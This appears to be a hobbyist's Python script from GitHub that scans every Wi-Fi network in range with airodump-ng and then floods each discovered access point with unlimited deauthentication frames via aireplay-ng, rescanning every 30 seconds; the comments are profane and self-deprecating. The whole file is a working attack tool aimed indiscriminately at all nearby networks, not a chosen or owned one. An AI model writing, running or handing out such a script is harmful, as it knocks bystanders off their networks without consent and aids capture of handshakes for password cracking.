import os
import time
import subprocess
import csv
import threading
# random deauth script just put on github for testing its a pretty shit script cause i didn't makeit target 1 network then target the next it will do the same 1 but i will maybe make it do that later

def monmode():
  global intface
  print("Running wlan0mon")
  intface = "wlan0mon"
monmode()
# FUCK BRO MY BACKHURTS FROM TRYING TO FIGURE OUT HOW THE FUCKING RESCAN THREAD WAS FUCKING UP TO LEGIT SO LONG 

def handshake():
 os.system("rm -rf pwn-01.csv")
 time.sleep(5)
 names = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
 pwn = subprocess.Popen(["sudo", "airodump-ng", "-w", "pwn", "--write-interval", "1", "--output-format", "csv", f"{intface}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 os.system("clear")
 print("\033[0;42mSCANNING ALL NETWORKS THEN TARGETING... PLEASE WAIT 7seconds...\033[0m")
 time.sleep(7) # um
 pwn.terminate()
 seen_essids = set()
 os.system("clear")
 threading.Timer(30, handshake).start()
 print("\nRESCANNING IN 30 SECONDS\n")
 print("\n\033[0;35mPLEASE WAIT... AS SOON AS SSIDS POP UP IT WILL START ATTACKING\n ")
 print("\r                       ALL WIFIS TO ATTACK ")
 print("\r   ATTACKING")
 print("\r\033[0;33m -------------\r")
  
 with open("pwn-01.csv", "r") as read_csv:
    sec_read = csv.DictReader(read_csv, names)
    next(sec_read)
    for rows in sec_read: 
      global essid # yes i know its global and not being used global lol just keep it here
      global mac,ch
      essid = rows["ESSID"]
      mac = rows["BSSID"].strip()
      ch = rows["channel"].strip()
      if essid:
       if essid not in seen_essids:
        print(f"\033[0;32m{essid}\n")
        seen_essids.add(essid)
        global term,term2
        term = subprocess.Popen(["sudo", "airodump-ng", "-c", ch, intface], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        time.sleep(0.022)
        term2 = subprocess.Popen(["sudo", "aireplay-ng", "-0", "0", "-a", mac, intface], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        time.sleep(0.022)
        time.sleep(10)
        term.terminate()
        term2.terminate()

handshake()
